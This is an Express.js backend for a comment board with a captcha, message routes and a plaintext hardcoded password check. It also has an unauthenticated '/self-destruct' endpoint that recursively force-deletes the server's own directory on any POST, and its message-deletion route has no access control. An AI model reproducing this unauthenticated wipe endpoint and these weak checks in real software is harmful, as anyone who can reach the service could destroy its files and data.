const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3001;
const { rm } = require('fs/promises'); 
app.use(cors());
app.use(bodyParser.json());



// 评论数据存储
let messages = [];

// 验证码存储（使用sessionId作为键）
const captchaStore = {};
const wcnm = '6565'; 
// 生成验证码
const generateCaptcha = () => {
    const characters = '渣渣辉方块轩肥鱼碧月狐验证码OHH';
    let captcha = '';
    for (let i = 0; i < 3; i++) {
        captcha += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return captcha;
};

// 设置生成验证码的路由
app.get('/captcha', (req, res) => {
    const captcha = generateCaptcha();
    const sessionId = req.headers['x-session-id'] || 'default'; // 使用请求头的sessionId，如果不存在则默认为'default'
    captchaStore[sessionId] = captcha;
    res.json({ captcha });
});

// 设置验证验证码的路由
app.post('/verifyCaptcha', (req, res) => {
    const { captcha } = req.body;
    const sessionId = req.headers['x-session-id'] || 'default';
    const storedCaptcha = captchaStore[sessionId];

    if (storedCaptcha === captcha) {
        delete captchaStore[sessionId];
        res.json({ verified: true });
    } else {
        res.status(400).json({ verified: false, message: '验证码不对' });
    }
});

// 获取所有评论
app.get('/messages', (req, res) => {
    res.json(messages);
});

// 提交评论
app.post('/messages', (req, res) => {
    const { name, message, isAdmin, orderId } = req.body; // 新增orderId
    if (name && message && orderId) { // 验证orderId
        const id = Date.now(); // 生成基于时间的ID
        const newMessage = { id, name, message, isAdmin: isAdmin || false, orderId }; // 新增orderId字段
        messages.push(newMessage);
        res.status(201).json(newMessage);
    } else {
        res.status(400).send('Name, message, and orderId are required');
    }
});
// 删除评论
app.delete('/messages/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const index = messages.findIndex(msg => msg.id === id);
    if (index !== -1) {
        messages.splice(index, 1);
        res.status(204).send();
    } else {
        res.status(404).send('Message not found');
    }
});

// 数据榜
app.post('/ban/good', (req, res) => {
    const { password } = req.body;
    if (password === wcnm) {
        res.json({ authenticated: true });
    } else {
        res.status(401).json({ authenticated: false });
    }
});
// 自毁API端点
app.post('/self-destruct', async (req, res) => {
    console.log('Self-destruct request received.');

    const directoryPath = path.join(__dirname, ''); // 请替换为实际的目录路径
    console.log('Target directory set to:', directoryPath);

    try {
        // 使用fs.rm代替fs.rmdir，并且使用recursive选项
        await rm(directoryPath, { recursive: true, force: true });
        res.send('Self-destruct successful. All files have been deleted.');
    } catch (error) {
        console.error('Error during self-destruct:', error);
        res.status(500).send(`Error during self-destruct: ${error.message}`);
    }
});
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});